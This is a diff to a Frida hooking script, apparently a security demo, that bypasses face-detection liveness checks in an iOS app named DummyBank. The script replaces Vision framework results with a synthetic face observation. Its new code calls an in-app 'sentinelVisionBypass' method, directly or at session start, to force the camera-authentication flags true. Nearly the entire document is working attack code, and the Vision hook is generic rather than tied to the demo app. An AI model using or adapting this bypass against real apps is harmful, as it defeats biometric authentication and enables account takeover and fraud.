@@ -1,7 +1,6 @@
 /**
  * Sentinel Hook - Enterprise AI Vision Bypass
- * Target: CoreML / Vision Framework Liveness Detection
- * Defense: Robust Swift Object Pointer Retention
+ * FIXED: Calls sentinelVisionBypass() to update Swift state and trigger UI.
  */
 
 if (ObjC.available) {
@@ -10,6 +9,7 @@ if (ObjC.available) {
     var VNDetectFaceRectanglesRequest = ObjC.classes.VNDetectFaceRectanglesRequest;
     var VNFaceObservation = ObjC.classes.VNFaceObservation;
     var NSArray = ObjC.classes.NSArray;
+    var targetClassName = "_TtC9DummyBank13CameraManager";
     
     if (VNDetectFaceRectanglesRequest && VNFaceObservation) {
         console.log("[+] TARGET LOCKED: Vision Engine mapped. Patching arrays...");
@@ -22,18 +22,12 @@ if (ObjC.available) {
                 onLeave: function(retval) {
                     try {
                         if (!cachedFakeResults) {
-                            // Swift array bridging memory protection
                             var face = VNFaceObservation.alloc().init();
                             var array = NSArray.arrayWithObject_(face);
-                            
-                            // Prevent Frida GC from annihilating Swift objects
-                            cachedFakeResults = array.retain(); 
-                            face.retain(); 
-                            
+                            cachedFakeResults = array.retain();
+                            face.retain();
                             console.log("[+] MEMORY PATCH: Allocated persistent synthetic observation.");
                         }
-
-                        // Override output
                         retval.replace(cachedFakeResults);
 
                         var now = Date.now();
@@ -41,15 +35,34 @@ if (ObjC.available) {
                             console.log("[💥] SENTINEL INTEL: ML Vision Engine successfully spoofed. (Trust established)");
                             lastLogTime = now;
                         }
-                    } catch(e) {
-                         // Silent fail to prevent crash in rapid CV loop
-                    }
+                    } catch(e) {}
                 }
             });
         } catch(err) {
-            console.log("[-] FATAL: Failed to hook Vision properties - " + err.message);
+            console.log("[-] FATAL: Vision hook failed - " + err.message);
         }
-    } else {
-        console.log("[-] WARNING: CoreML/Vision frameworks not loaded in current process.");
+    }
+
+    // KEY FIX: Call sentinelVisionBypass() to set isCameraAuthenticated → triggers COMPROMISED screen
+    try {
+        var AppCameraManager = ObjC.classes[targetClassName];
+        if (AppCameraManager) {
+            var instances = ObjC.chooseSync(AppCameraManager);
+            if (instances.length > 0) {
+                console.log("[💥] SENTINEL VISION: Calling sentinelVisionBypass() on live instance...");
+                instances[0]["- sentinelVisionBypass"]();
+                console.log("[✅] VISION GATE: aiFaceDetected + isCameraAuthenticated → TRUE. UI notified.");
+            } else {
+                // Hook startup to fire bypass when session starts
+                Interceptor.attach(AppCameraManager["- startDummySessionForSimulator"].implementation, {
+                    onEnter: function(args) {
+                        new ObjC.Object(args[0])["- sentinelVisionBypass"]();
+                        console.log("[✅] VISION GATE: bypass injected at session start.");
+                    }
+                });
+            }
+        }
+    } catch(e) {
+        console.log("[-] Vision bypass call failed: " + e.message);
     }
 }
